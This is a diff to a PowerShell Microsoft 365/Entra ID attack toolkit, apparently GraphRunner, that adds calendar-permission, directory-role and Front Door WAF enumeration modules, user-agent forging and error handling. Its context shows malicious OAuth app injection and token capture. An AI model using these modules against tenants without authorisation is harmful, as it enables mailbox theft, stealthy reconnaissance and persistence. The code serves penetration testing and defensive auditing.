@@ -21,7 +21,7 @@ function Get-GraphTokens{
         Optional Dependencies: None
 
     .DESCRIPTION
-        
+
        Get-GraphTokens is the main user authentication module for GraphRunner. Upon authenticating it will store your tokens in the global $tokens variable as well as the tenant ID in $tenantid. To use them with other GraphRunner modules use the Tokens flag (Example. Invoke-DumpApps -Tokens $tokens)     
     
     .PARAMETER UserPasswordAuth
@@ -484,7 +484,7 @@ function Invoke-InjectOAuthApp{
     
      .PARAMETER Tokens
         
-        Provide an already authenticated access token. 
+        Provide an already authenticated access token.
 
     .EXAMPLE
         
@@ -492,9 +492,9 @@ function Invoke-InjectOAuthApp{
         Description
         -----------
         This command will inject an app registration with the display name of "Win Defend for M365" with a scope of openid, Mail.Read, email, profile, and offline_access
-    
+
     .EXAMPLE
-        
+
         C:\PS> Invoke-InjectOAuthApp -AppName "Not a Backdoor" -ReplyUrl "http://localhost:10000" -scope "op backdoor" -Tokens $tokens
         Description
         -----------
@@ -782,7 +782,7 @@ function Invoke-ImmersiveFileReader{
         Optional Dependencies: None
 
     .DESCRIPTION
-        
+
        Simple module to read a file with the immersive reader.
 
     .PARAMETER SharePointDomain
@@ -818,24 +818,32 @@ function Invoke-ImmersiveFileReader{
         $FileID,
         [Parameter(Mandatory = $False)]
         [object[]]
-        $Tokens
-    )
-    if ($Device) {
-        if ($Browser) {
-            $UserAgent = Invoke-ForgeUserAgent -Device $Device -Browser $Browser
+        $Tokens,
+        [Parameter(Mandatory=$False)]
+        [ValidateSet('Mac','Windows','AndroidMobile','iPhone')]
+        [String]$Device,
+        [Parameter(Mandatory=$False)]
+        [ValidateSet('Android','IE','Chrome','Firefox','Edge','Safari')]
+        [String]$Browser
+        )
+        if ($Device) {
+            if ($Browser) {
+                $UserAgent = Invoke-ForgeUserAgent -Device $Device -Browser $Browser
+            }
+            else {
+                $UserAgent = Invoke-ForgeUserAgent -Device $Device
+            }
         }
         else {
-            $UserAgent = Invoke-ForgeUserAgent -Device $Device
+           if ($Browser) {
+                $UserAgent = Invoke-ForgeUserAgent -Browser $Browser 
+           } 
+           else {
+                $UserAgent = Invoke-ForgeUserAgent
+           }
         }
-    }
-    else {
-        if ($Browser) {
-            $UserAgent = Invoke-ForgeUserAgent -Browser $Browser 
-        } 
-        else {
-            $UserAgent = Invoke-ForgeUserAgent
-        }
-    }
+        $Headers=@{}
+        $Headers["User-Agent"] = $UserAgent
     if($Tokens){
         Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
     }
@@ -859,13 +867,10 @@ function Invoke-ImmersiveFileReader{
                 }
             }
     }
-
-    $Headers=@{}
-    $Headers["User-Agent"] = $UserAgent
     $Headers["Host"] = 'southcentralus1-mediap.svc.ms'
     $Headers["Accept-Language"] = "en-US"
     
-    Invoke-RefreshToSharePointToken -domain $SharePointDomain -ClientId "d326c1ce-6cc6-4de2-bebc-4591e5e13ef0" -Tokens $tokens
+    Invoke-RefreshToSharePointToken -domain $SharePointDomain -ClientId "d326c1ce-6cc6-4de2-bebc-4591e5e13ef0" -Tokens $tokens -Device $Device -Browser $Browser
    
     try {
         $request = Invoke-WebRequest -UseBasicParsing -Headers $Headers -Method GET -Uri "https://southcentralus1-mediap.svc.ms/transform/imreader?provider=spo&inputFormat=txt&cs=fFNQTw&docid=https%3A%2F%2F$($SharePointDomain)%3A443%2F_api%2Fv2.0%2Fdrives%2F$($DriveID)%2Fitems%2F$($FileID)%3Fversion%3DPublished&access_token=$($global:SharePointToken.access_token)&nocache=true"
@@ -1010,6 +1015,184 @@ Function Invoke-GraphOpenInboxFinder{
 
 
 
+Function Find-PermissiveCalendars{
+    <#
+    .SYNOPSIS
+
+        A module that can be used to find calendars in the tenant that are shared more permissively than free/busy visibility. This checks permissions similar to how Invoke-GraphOpenInboxFinder checks for readable inboxes. NOTE: You must have calendar read permissions to enumerate these settings with Microsoft Graph.
+        Author: Beau Bullock (@dafthack)
+        License: MIT
+        Required Dependencies: None
+        Optional Dependencies: None
+
+    .DESCRIPTION
+
+       A module that can be used to find calendars in the tenant that are shared more permissively than free/busy visibility. By default it will enumerate all users in the tenant unless you provide a user list.
+
+    .PARAMETER Tokens
+
+        Provide an already authenticated access token.
+
+    .PARAMETER UserList
+
+        Optional userlist of users to check (one per line)
+
+    .PARAMETER OutFile
+
+        Optional CSV file to export results to
+
+    .EXAMPLE
+
+        C:\PS> Find-PermissiveCalendars -Tokens $tokens
+        Description
+        -----------
+        Using this module will attempt to enumerate calendar permissions for all users in the tenant and flag anything more permissive than free/busy.
+
+    .EXAMPLE
+
+        C:\PS> Find-PermissiveCalendars -Tokens $tokens -UserList userlist.txt -OutFile permissive-calendars.csv
+    #>
+
+    param(
+    [Parameter(Position = 0, Mandatory = $true)]
+    [object[]]
+    $Tokens = "",
+    [Parameter(Position = 1, Mandatory = $false)]
+    [string]
+    $UserList = "",
+    [Parameter(Position = 2, Mandatory = $false)]
+    [string]
+    $OutFile = ""
+    )
+
+    if($tokens){
+        $access_token = $tokens.access_token
+    }
+    else{
+        Write-Host -ForegroundColor yellow "[*] No tokens detected. Pass your authenticated tokens to this module with the -Tokens option."
+        return
+    }
+
+    if($UserList){
+        $CalendarUsers = @(Get-Content -Path $UserList)
+        Write-Host -ForegroundColor yellow "[*] Using the provided user list."
+    }
+    else{
+        Write-Host -ForegroundColor yellow "[*] No user list provided. Gathering users from the tenant."
+        $CalendarUsers = @()
+        $usersEndpoint = "https://graph.microsoft.com/v1.0/users?`$select=userPrincipalName&`$top=999"
+        do{
+            try{
+                $request = Invoke-WebRequest -UseBasicParsing -Method GET -Uri $usersEndpoint -Headers @{"Authorization" = "Bearer $access_token"}
+            }catch{
+                if($_.Exception.Response.StatusCode.value__ -match "429"){
+                    Write-Host -ForegroundColor red "[*] Being throttled... sleeping 5 seconds"
+                    Start-Sleep -Seconds 5
+                    continue
+                }
+                Write-Host -ForegroundColor red "[*] Error gathering users: $($_.Exception.Message)"
+                return
+            }
+
+            $out = $request.Content | ConvertFrom-Json
+            $CalendarUsers += $out.value.userPrincipalName
+            if ($out.'@odata.nextLink') {
+                $usersEndpoint = $out.'@odata.nextLink'
+            }
+            else {
+                break
+            }
+        } while ($true)
+    }
+
+    if (!$CalendarUsers){return}
+
+    $resultsList = @()
+    $count = $CalendarUsers.count
+    $curr_usr = 0
+    $authzWarningShown = $false
+    Write-Host -ForegroundColor yellow "[*] Note: To enumerate other users' calendar permissions your token needs calendar read permissions such as Calendars.ReadBasic, Calendars.Read, or Calendars.ReadWrite."
+    Write-Output "`n`r"
+    Write-Output "[*] Checking calendar permissions for each user..."
+    Write-Output "`n`r"
+
+    foreach($calendarUser in $CalendarUsers)
+    {
+        Write-Host -nonewline "$curr_usr of $count calendars checked`r"
+        $curr_usr += 1
+        $encodedUser = [System.Uri]::EscapeDataString($calendarUser)
+
+        try {
+            $request = Invoke-WebRequest -UseBasicParsing -Method GET -Uri "https://graph.microsoft.com/v1.0/users/$encodedUser/calendar/calendarPermissions" -Headers @{"Authorization" = "Bearer $access_token"}
+        }catch{
+            $statusCode = $null
+            if ($_.Exception.Response) {
+                $statusCode = $_.Exception.Response.StatusCode.Value__
+            }
+
+            if ($statusCode -eq 403 -and -not $authzWarningShown) {
+                Write-Host ""
+                Write-Host -ForegroundColor Red "[*] Access denied while reading calendar permissions."
+                Write-Host -ForegroundColor Yellow "[*] Your token may be missing the required calendar scopes, or you may not have access to enumerate these calendars."
+                $authzWarningShown = $true
+            }
+            continue
+        }
+
+        $permissions = ($request.Content | ConvertFrom-Json).value
+        foreach ($permission in @($permissions)) {
+            if ($permission.role -in @("none","freeBusyRead")) {
+                continue
+            }
+
+            if ($permission.isInsideOrganization -ne $true) {
+                continue
+            }
+
+            $grantedTo = $permission.emailAddress.name
+            if (!$grantedTo) {
+                $grantedTo = $permission.emailAddress.address
+            }
+            if (!$grantedTo) {
+                $grantedTo = "My Organization"
+            }
+
+            $isOrgWide = $false
+            if ($permission.id -eq "RGVmYXVsdA==" -or $grantedTo -eq "My Organization") {
+                $isOrgWide = $true
+            }
+
+            $logInfo = @{
+                "Calendar Owner" = $calendarUser
+                "Granted To" = $grantedTo
+                "Role" = $permission.role
+                "Inside Organization" = $permission.isInsideOrganization
+                "Org Wide Setting" = $isOrgWide
+            }
+
+            $resultsList += New-Object PSObject -Property $logInfo
+            Write-Host -ForegroundColor Green ("[*] Found permissive calendar access: " + $calendarUser + " -> " + $grantedTo + " (" + $permission.role + ")")
+        }
+    }
+
+    Write-Host ""
+    if ($resultsList.Count -gt 0) {
+        Write-Host -ForegroundColor Green ("[*] Found " + $resultsList.Count + " permissive calendar permission entries.")
+        foreach ($result in $resultsList) {
+            Write-Output ("Calendar Owner: " + $result."Calendar Owner" + " | Granted To: " + $result."Granted To" + " | Role: " + $result.Role + " | Org Wide Setting: " + $result."Org Wide Setting")
+            Write-Output ("=" * 80)
+        }
+        if($OutFile){
+            Write-Host -ForegroundColor yellow "[*] Writing results to $OutFile"
+            $resultsList | Export-Csv -Path $OutFile -NoTypeInformation
+        }
+    }
+    else{
+        Write-Host -ForegroundColor yellow "[*] No overly permissive calendar permissions were found."
+    }
+}
+
+
 Function Get-AzureAppTokens{
     <#
         .SYNOPSIS
@@ -1087,9 +1270,13 @@ Function Get-AzureAppTokens{
     $request = Invoke-WebRequest -UseBasicParsing -Method POST -ContentType "application/x-www-form-urlencoded" -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body $body
     }
     catch{
-    $details=$_.ErrorDetails.Message | ConvertFrom-Json
-    $continue = $details.error -eq "authorization_pending"
-    Write-Output $details.error
+    if (-not [string]::IsNullOrEmpty($_.ErrorDetails.Message)) {
+        $details = $_.ErrorDetails.Message | ConvertFrom-Json
+        $continue = $details.error -eq "authorization_pending"
+        Write-Output $details.error
+    } else {
+        Write-Output "Error: $_"
+    }
     }
     if($request)
         {
@@ -1097,8 +1284,12 @@ Function Get-AzureAppTokens{
                 $global:apptokens = $request.Content | ConvertFrom-Json
             }
             catch{
-                $details=$_.ErrorDetails.Message | ConvertFrom-Json
-                Write-Output $details.error
+                if (-not [string]::IsNullOrEmpty($_.ErrorDetails.Message)) {
+                    $details = $_.ErrorDetails.Message | ConvertFrom-Json
+                    Write-Output $details.error
+                } else {
+                    Write-Output "Error: $_"
+                }
                 return
             }
             Write-Output "---Here is your access token---"
@@ -1308,32 +1499,47 @@ Function Invoke-AutoOAuthFlow{
 
     Write-Host "Listening for incoming requests on http://localhost:$port/"
 
-    $oauthcodes  = @()
-    while ($true) {
-        $context = $listener.GetContext() # This blocks until a request is received
+    $oauthcodes = @()
+    while ($listener.IsListening) {
+        try {
+            $context = $listener.GetContext() # This blocks until a request is received
+        } catch {
+            if (-not $listener.IsListening) { break }
+            Write-Host "[-] Listener error: $_"
+            continue
+        }
+
         $request = $context.Request
         $response = $context.Response
 
         # Capture the OAuth code from the query parameters
         $queryParams = [System.Web.HttpUtility]::ParseQueryString($request.Url.Query)
         $oauthCode = $queryParams["code"]
-            
-        Write-Host "Captured OAuth code: $oauthCode"
 
         # Respond to the client
         $responseText = "OAuth code captured successfully."
         $responseBytes = [System.Text.Encoding]::UTF8.GetBytes($responseText)
-        $response.OutputStream.Write($responseBytes, 0, $responseBytes.Length)
-        $response.Close()
-            
-        if($oauthCode -notin $oauthcodes){
-        Get-AzureAppTokens -ClientId $ClientID -ClientSecret $ClientSecret -RedirectUri $RedirectUri -scope $Scope -AuthCode $oauthCode
+        try {
+            $response.OutputStream.Write($responseBytes, 0, $responseBytes.Length)
+            $response.Close()
+        } catch {
+            Write-Host "[-] Error sending HTTP response: $_"
         }
-        else{
+
+        if ([string]::IsNullOrEmpty($oauthCode)) {
+            continue
+        }
+
+        Write-Host "Captured OAuth code: $oauthCode"
+
+        if ($oauthCode -notin $oauthcodes) {
+            $oauthcodes += $oauthCode
+            Get-AzureAppTokens -ClientId $ClientID -ClientSecret $ClientSecret -RedirectUri $RedirectUri -scope $Scope -AuthCode $oauthCode
+            $listener.Stop()
+            break
+        } else {
             Write-Host "[*] Skipping OAuth code we've already seen..."
         }
-        $oauthcodes += $oauthCode
-
     }
 
 }
@@ -1415,13 +1621,29 @@ Function Get-Inbox{
     $access_token = $tokens.access_token   
     [string]$refresh_token = $tokens.refresh_token 
 
-    $request = Invoke-WebRequest -UseBasicParsing -Method GET -Uri "https://graph.microsoft.com/v1.0/users/$userid/mailFolders/Inbox/messages?`$top=$TotalMessages" -Headers @{"Authorization" = "Bearer $access_token"}
+    try {
+        $request = Invoke-WebRequest -UseBasicParsing -Method GET -Uri "https://graph.microsoft.com/v1.0/users/$userid/mailFolders/Inbox/messages?`$top=$TotalMessages" -Headers @{"Authorization" = "Bearer $access_token"}
+    } catch {
+        $statusCode = $null
+        if ($_.Exception.Response) {
+            $statusCode = $_.Exception.Response.StatusCode.value__
+        }
+
+        if ($statusCode -eq 403) {
+            Write-Host -ForegroundColor Red "[*] Access denied while reading mailbox '$userid'."
+            Write-Host -ForegroundColor Yellow "[*] Your token may be missing the required mail scopes, or you may not have access to this mailbox."
+            Write-Host -ForegroundColor Yellow "[*] For shared or other users' mailboxes, ensure the token has permissions such as Mail.Read.Shared or Mail.ReadWrite.Shared and that mailbox access is allowed."
+        } else {
+            Write-Host -ForegroundColor Red ("[*] Failed to retrieve inbox messages: " + $_.Exception.Message)
+        }
+        return
+    }
     $out = $request.Content | ConvertFrom-Json
     $resultsList = @()
     foreach ($hit in $out.value) {
             $subject = $hit.subject
             $sender = $hit.sender.emailAddress.address
-            $receivers = $hit.toRecipients.emailAddres.address
+            $receivers = $hit.toRecipients.emailAddress.address
             $date = $hit.sentDateTime
             $preview = $hit.bodyPreview
             $body = $hit.body.content
@@ -3128,13 +3350,39 @@ Function Get-AzureADUsers{
     [Parameter(Position = 0, Mandatory = $true)]
     [object[]]
     $Tokens = "",
-    [Parameter(Position = 1, Mandatory = $true)]
+    [Parameter(Mandatory=$false)]
+    [string]$Resource = "https://graph.microsoft.com/",
+    [Parameter(Mandatory=$false)]
+    [ValidateSet('Mac','Windows','AndroidMobile','iPhone')]
+    [String]$Device = "Windows",
+    [Parameter(Mandatory=$false)]
+    [ValidateSet('Android','IE','Chrome','Firefox','Edge','Safari')]
+    [String]$Browser = "Edge",
+    [Parameter(Mandatory=$False)]
+    [String]$ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c",  
+    [Parameter(Mandatory = $true)]
     [string]
-    $outfile = "",
+    $outfile = "AzureADUsers.log",
     [switch]
     $GraphRun
     )
     $access_token = $tokens.access_token
+    if ($Device) {
+		if ($Browser) {
+			$UserAgent = Invoke-ForgeUserAgent -Device $Device -Browser $Browser
+		}
+		else {
+			$UserAgent = Invoke-ForgeUserAgent -Device $Device
+		}
+	}
+	else {
+	   if ($Browser) {
+			$UserAgent = Invoke-ForgeUserAgent -Browser $Browser 
+	   } 
+	   else {
+			$UserAgent = Invoke-ForgeUserAgent
+	   }
+	}
     if(!$GraphRun){
     Write-Host "[*] Gathering the users from the tenant."
     }
@@ -3142,7 +3390,12 @@ Function Get-AzureADUsers{
     $userlist = @()
     do{
         try{
-		$request = Invoke-WebRequest -UseBasicParsing -Method GET -Uri $usersEndpoint -Headers @{"Authorization" = "Bearer $access_token"}
+            $Headers = @{
+                "Authorization" = "Bearer $access_token"
+                "User-Agent" = $UserAgent
+            }
+
+		    $request = Invoke-WebRequest -UseBasicParsing -Method GET -Uri $usersEndpoint -Headers $Headers
         }catch {
 		if($_.Exception.Response.StatusCode.value__ -match "429"){
                 Write-Host -ForegroundColor red "[*] Being throttled... sleeping 5 seconds"
@@ -3222,10 +3475,30 @@ Function Invoke-DumpCAPS{
     [object[]]
     $Tokens = "",
     [switch]
-    $GraphRun
-
+    $GraphRun,
+    [Parameter(Mandatory=$False)]
+    [ValidateSet('Mac','Windows','AndroidMobile','iPhone')]
+    [String]$Device,
+    [Parameter(Mandatory=$False)]
+    [ValidateSet('Android','IE','Chrome','Firefox','Edge','Safari')]
+    [String]$Browser
     )
-
+    if ($Device) {
+		if ($Browser) {
+			$UserAgent = Invoke-ForgeUserAgent -Device $Device -Browser $Browser
+		}
+		else {
+			$UserAgent = Invoke-ForgeUserAgent -Device $Device
+		}
+	}
+	else {
+	   if ($Browser) {
+			$UserAgent = Invoke-ForgeUserAgent -Browser $Browser 
+	   } 
+	   else {
+			$UserAgent = Invoke-ForgeUserAgent
+	   }
+	}
     if($Tokens){
         if(!$GraphRun){
         Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
@@ -3236,6 +3509,7 @@ Function Invoke-DumpCAPS{
         $refreshbody = @{
                 "resource" = "https://graph.windows.net/"
                 "client_id" =     "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
+                "User-Agent" = $UserAgent
                 "grant_type" =    "refresh_token"
                 "refresh_token" = $RefreshToken
                 "scope"=         "openid"
@@ -3262,7 +3536,6 @@ Function Invoke-DumpCAPS{
             "client_id" =     "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
             "resource" =      "https://graph.windows.net/"
         }
-        $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
         $Headers=@{}
         $Headers["User-Agent"] = $UserAgent
         $authResponse = Invoke-RestMethod `
@@ -3309,6 +3582,7 @@ Function Invoke-DumpCAPS{
 
     $HeadersAuth = @{
         Authorization = "Bearer $access_token"
+        "User-Agent" = $UserAgent
     }
 
     $CAPSUrl = "https://graph.windows.net/$tenantid/policies?api-version=1.61-internal"
@@ -3876,6 +4150,168 @@ function Get-SecurityGroups{
     return $groupsWithMemberIDs
 }
 
+function Get-DirectoryRoles{
+    <#
+    .SYNOPSIS
+
+        Gather the activated directory roles and their assigned members.
+        Author: Beau Bullock (@dafthack)
+        License: MIT
+        Required Dependencies: None
+        Optional Dependencies: None
+
+    .DESCRIPTION
+
+       Gather the activated directory roles and their assigned members. This uses the Microsoft Graph directoryRoles API, so it only returns roles that are activated in the tenant.
+
+    .PARAMETER Tokens
+
+        Pass the $tokens global variable after authenticating to this parameter
+
+    .PARAMETER OutputFile
+
+        The path to the CSV file where the directory roles will be exported.
+
+    .EXAMPLE
+
+        C:\PS> Get-DirectoryRoles -Tokens $tokens -OutputFile "directory_roles.csv"
+        -----------
+        This will dump all activated directory roles and their members to the specified CSV file.
+    #>
+    param (
+        [Parameter(Mandatory = $False)]
+        [object] $Tokens,
+        [Parameter(Mandatory = $False)]
+        [string] $OutputFile = "directory_roles.csv",
+        [Parameter(Mandatory = $False)]
+        [switch] $GraphRun
+    )
+
+    if ($Tokens) {
+        if (!$GraphRun) {
+            Write-Host -ForegroundColor Yellow "[*] Using the provided access tokens."
+        }
+    } else {
+        Write-Host -ForegroundColor Yellow "[*] First, you need to log in."
+        Write-Host -ForegroundColor Yellow "[*] If you already have tokens, you can use the -Tokens parameter to pass them to this function."
+        while ($auth -notlike "Yes") {
+            Write-Host -ForegroundColor Cyan "[*] Do you want to authenticate now (yes/no)?"
+            $answer = Read-Host
+            $answer = $answer.ToLower()
+            if ($answer -eq "yes" -or $answer -eq "y") {
+                Write-Host -ForegroundColor Yellow "[*] Running Get-GraphTokens now..."
+                $tokens = Get-GraphTokens -ExternalCall
+                $auth = "Yes"
+            } elseif ($answer -eq "no" -or $answer -eq "n") {
+                Write-Host -ForegroundColor Yellow "[*] Quitting..."
+                return
+            } else {
+                Write-Host -ForegroundColor Red "Invalid input. Please enter Yes or No."
+            }
+        }
+    }
+
+    $accessToken = $tokens.access_token
+    $headers = @{
+        Authorization = "Bearer $accessToken"
+    }
+
+    if (!$GraphRun) {
+        Write-Host -ForegroundColor Yellow "[*] Retrieving activated directory roles and their members from the directory..."
+    }
+
+    $graphApiUrl = "https://graph.microsoft.com/v1.0"
+    $rolesUrl = "$graphApiUrl/directoryRoles"
+    $directoryRolesWithMembers = @()
+
+    do {
+        try {
+            $rolesResponse = Invoke-RestMethod -Uri $rolesUrl -Headers $headers -Method Get
+            $roles = $rolesResponse.value
+        } catch {
+            Write-Host -ForegroundColor Red "[*] An error occurred while retrieving directory roles: $($_.Exception.Message)"
+            return
+        }
+
+        foreach ($role in $roles) {
+            $roleId = $role.id
+            $membersUrl = "$graphApiUrl/directoryRoles/$roleId/members"
+            $members = @()
+
+            try {
+                $membersResponse = Invoke-RestMethod -Uri $membersUrl -Headers $headers -Method Get
+                $members = @($membersResponse.value)
+            } catch {
+                if ($_.Exception.Response.StatusCode.value__ -match "429") {
+                    Write-Host -ForegroundColor Red "[*] Being throttled... sleeping for 5 seconds"
+                    Start-Sleep -Seconds 5
+                    try {
+                        $membersResponse = Invoke-RestMethod -Uri $membersUrl -Headers $headers -Method Get
+                        $members = @($membersResponse.value)
+                    } catch {
+                        Write-Host -ForegroundColor Red "[*] An error occurred while retrieving members for role $($role.displayName): $($_.Exception.Message)"
+                        continue
+                    }
+                } else {
+                    Write-Host -ForegroundColor Red "[*] An error occurred while retrieving members for role $($role.displayName): $($_.Exception.Message)"
+                    continue
+                }
+            }
+
+            $memberNames = @()
+            $memberIds = @()
+
+            foreach ($member in $members) {
+                $memberIds += $member.id
+                if ($member.userPrincipalName) {
+                    $memberNames += $member.userPrincipalName
+                } elseif ($member.mail) {
+                    $memberNames += $member.mail
+                } elseif ($member.displayName) {
+                    $memberNames += $member.displayName
+                } else {
+                    $memberNames += $member.id
+                }
+            }
+
+            $roleInfo = @{
+                RoleName = $role.displayName
+                RoleId = $roleId
+                RoleTemplateId = $role.roleTemplateId
+                Description = $role.description
+                MemberIds = $memberIds -join ","
+                Members = $memberNames -join ","
+            }
+
+            Write-Output ("Role Name: " + $role.displayName + " | Role ID: " + $roleId)
+            if ($memberNames.Count -gt 0) {
+                Write-Output ("Members: " + ($memberNames -join ', '))
+            } else {
+                Write-Output "Members: "
+            }
+            Write-Output ""
+            Write-Output ("=" * 80)
+            $directoryRolesWithMembers += New-Object PSObject -Property $roleInfo
+        }
+
+        if ($rolesResponse.'@odata.nextLink') {
+            $rolesUrl = $rolesResponse.'@odata.nextLink'
+            if (!$GraphRun) {
+                Write-Host -ForegroundColor Yellow "[*] Processing more directory roles..."
+            }
+        } else {
+            $rolesUrl = $null
+        }
+    } while ($rolesUrl)
+
+    if ($OutputFile) {
+        $directoryRolesWithMembers | Export-Csv -Path $OutputFile -NoTypeInformation
+        Write-Host -ForegroundColor Green "Directory roles exported to $OutputFile."
+    }
+
+    return $directoryRolesWithMembers
+}
+
 function Create-SecurityGroupWithMembers {
     param (
         [string] $AccessToken,
@@ -4181,6 +4617,9 @@ function Get-UpdatableGroups{
         [Parameter(Mandatory = $False)]
         [string]
         $OutputFile = "Updatable_groups.csv",  # Set the default value to "Updatable_groups.csv"
+        [Parameter(Mandatory = $False)]
+        [string[]]
+        $Keyword,
         [Parameter(Mandatory=$False)]
         [switch]
         $AutoRefresh,
@@ -4200,6 +4639,9 @@ function Get-UpdatableGroups{
         $results = @()
 
         Write-Host -ForegroundColor yellow "[*] Now gathering groups and checking if each one is updatable."
+        if ($Keyword) {
+            Write-Host -ForegroundColor yellow ("[*] Limiting checks to groups matching keyword(s): " + ($Keyword -join ", "))
+        }
 
         $startTime = Get-Date
         $refresh_Interval = [TimeSpan]::FromSeconds($RefreshInterval)
@@ -4217,6 +4659,20 @@ function Get-UpdatableGroups{
                     }
                 }
                 foreach ($group in $response.value) {
+                    if ($Keyword) {
+                        $matchesKeyword = $false
+                        foreach ($item in $Keyword) {
+                            if (($group.displayName -and $group.displayName -like ("*" + $item + "*")) -or ($group.description -and $group.description -like ("*" + $item + "*"))) {
+                                $matchesKeyword = $true
+                                break
+                            }
+                        }
+
+                        if (-not $matchesKeyword) {
+                            continue
+                        }
+                    }
+
                     if ((Get-Date) - $startTime -ge $refresh_interval) {
                         Write-Host -ForegroundColor Yellow "[*] Pausing script for token refresh..."
                         $reftokens = Invoke-RefreshGraphTokens -RefreshToken $refreshToken -AutoRefresh -tenantid $global:tenantid -Resource $Resource -Client $Client -ClientID $ClientID -Browser $Browser -Device $Device
@@ -4930,7 +5386,166 @@ function Invoke-InviteGuest{
     }
 }
 
+function Check-FrontDoorWAF {
+    param (
+        [Parameter(Position = 0, Mandatory = $false)]
+        [object[]]$Tokens = "",
 
+        [Parameter(Mandatory = $false)]
+        [string]$OutputFile = "waf_remoteaddr_audit.txt"
+    )
+
+    # Validate token
+    if ($Tokens -and $Tokens[0].access_token) {
+        Write-Host -ForegroundColor Yellow "[*] Using the provided access tokens."
+        $AccessToken = $Tokens[0].access_token
+    }
+    else {
+        Write-Host -ForegroundColor Red "[!] No valid access token provided. Exiting..."
+        return
+    }
+
+    if ($Tokens.resource -ne "https://management.azure.com/") {
+        Write-Host -ForegroundColor Red "[!] The provided token is not scoped for the Azure Management API."
+        Write-Host -ForegroundColor Yellow "[*] You must first re-authenticate using:"
+        Write-Host -ForegroundColor Cyan "    Get-GraphTokens -resource 'https://management.azure.com/'"
+        return
+    }
+    Write-Host -ForegroundColor Yellow "[*] Using the provided management API access token."
+
+    # Fetch all subscriptions
+    try {
+        Write-Host -ForegroundColor Yellow "[*] Fetching subscriptions..."
+        $subsUri = "https://management.azure.com/subscriptions?api-version=2020-01-01"
+        $subsResult = Invoke-RestMethod -Uri $subsUri -Headers @{Authorization = "Bearer $AccessToken"}
+
+        if ($subsResult.value.Count -eq 0) {
+            Write-Host -ForegroundColor Red "[!] No subscriptions found for this token."
+            return
+        }
+    }
+    catch {
+        Write-Host -ForegroundColor Red "[!] Failed to fetch subscriptions."
+        Write-Host -ForegroundColor Yellow "    Status: $($_.Exception.Response.StatusCode.value__)"
+        return
+    }
+
+    # Clear previous results
+    $summary = @()
+    $allFindings = @()
+
+    # Loop through each subscription
+    foreach ($sub in $subsResult.value) {
+        $SubscriptionId = $sub.subscriptionId
+        Write-Host -ForegroundColor Cyan "`n[+] Scanning Subscription: $($sub.displayName) [$SubscriptionId]"
+
+        # List resource groups
+        $rgUri = "https://management.azure.com/subscriptions/${SubscriptionId}/resourcegroups?api-version=2022-09-01"
+
+        try {
+            $resourceGroups = (Invoke-RestMethod -Uri $rgUri -Headers @{Authorization = "Bearer $AccessToken"}).value
+        }
+        catch {
+            Write-Host -ForegroundColor Red "[!] Failed to list resource groups for subscription: $($sub.displayName)"
+            Write-Host -ForegroundColor Yellow "    URL: $rgUri"
+            Write-Host -ForegroundColor Yellow "    StatusCode: $($_.Exception.Response.StatusCode.value__)"
+            Write-Host -ForegroundColor Yellow "    StatusDescription: $($_.Exception.Response.StatusDescription)`n"
+            continue  # Move on to next subscription
+        }
+
+        if ($resourceGroups.count -eq 0){
+            Write-Host "No resource groups found"
+        }
+
+        foreach ($rg in $resourceGroups) {
+            $rgName = $rg.name
+
+            # List Front Door WAF policies in this RG
+            $wafUri = "https://management.azure.com/subscriptions/$SubscriptionId/resourceGroups/${rgName}/providers/Microsoft.Network/frontDoorWebApplicationFirewallPolicies?api-version=2022-05-01"
+            try {
+                $policies = (Invoke-RestMethod -Uri $wafUri -Headers @{Authorization = "Bearer $AccessToken"}).value
+            }
+            catch {
+                Write-Host -ForegroundColor Red "[!] Failed to list WAF policies in RG: $rgName (Subscription: $($sub.displayName))"
+                continue
+            }
+
+            foreach ($policy in $policies) {
+                $policyName = $policy.name
+
+                # Fetch the full WAF policy
+                $policyDetailUri = "https://management.azure.com/subscriptions/$SubscriptionId/resourceGroups/$rgName/providers/Microsoft.Network/frontDoorWebApplicationFirewallPolicies/${policyName}?api-version=2022-05-01"
+                try {
+                    $policyDetail = Invoke-RestMethod -Uri $policyDetailUri -Headers @{Authorization = "Bearer $AccessToken"}
+                }
+                catch {
+                    Write-Host -ForegroundColor Red "[!] Failed to fetch details for WAF policy: $policyName in RG: $rgName"
+                    continue
+                }
+
+                $rules = $policyDetail.properties.customRules.rules
+
+                $matches = foreach ($rule in $rules) {
+                    foreach ($cond in $rule.matchConditions) {
+                        if ($cond.matchVariable -eq "RemoteAddr" -and (-not ($cond.matchVariable -eq "SocketAddr"))) {
+                            $finding = [PSCustomObject]@{
+                                Subscription   = $sub.displayName
+                                ResourceGroup  = $rgName
+                                WAFName        = $policyName
+                                RuleName       = $rule.name
+                                Operator       = $cond.operator
+                                MatchVariable  = $cond.matchVariable
+                                MatchValues    = ($cond.matchValue -join ', ')
+                            }
+                            $allFindings += $finding
+                            $finding
+                        }
+                    }
+                }
+
+                if ($matches) {
+                    Write-Host "`n[!] VULNERABLE RULES FOUND in policy [$policyName] (RG: $rgName)" -ForegroundColor Yellow
+                    $matches | Select-Object -Property ResourceGroup,WAFName,RuleName,Operator,MatchVariable,MatchValues | Format-Table -AutoSize
+                    $summary += [PSCustomObject]@{
+                        Subscription    = $sub.displayName
+                        ResourceGroup   = $rgName
+                        WAFName         = $policyName
+                        VulnerableRules = $matches.Count
+                    }
+                } else {
+                    $summary += [PSCustomObject]@{
+                        Subscription    = $sub.displayName
+                        ResourceGroup   = $rgName
+                        WAFName         = $policyName
+                        VulnerableRules = 0
+                    }
+                }
+            }
+        }
+    }
+
+    # Summary
+    Write-Host "`n----------------------------------------------------------------------`n"
+    Write-Host "`n=== Summary of WAF RemoteAddr Matches (Excluding SocketAddr Rules) ===" -ForegroundColor Cyan
+    $summary | Select-Object -Property ResourceGroup,WAFName,VulnerableRules | Format-Table -AutoSize
+
+    # Save to file
+
+    "------------- Azure Front Door WAF RemoteAddr Checks -------------`n" | Out-File $OutputFile
+
+    $uniqueSubscriptions = $summary | Select-Object -ExpandProperty Subscription -Unique
+    foreach ($sub in $uniqueSubscriptions){
+        "[*] Subscription: $sub" | Out-File -Append $OutputFile
+        "=== RemoteAddr Rule Matches (Filtered) ===" | Out-File -Append $OutputFile
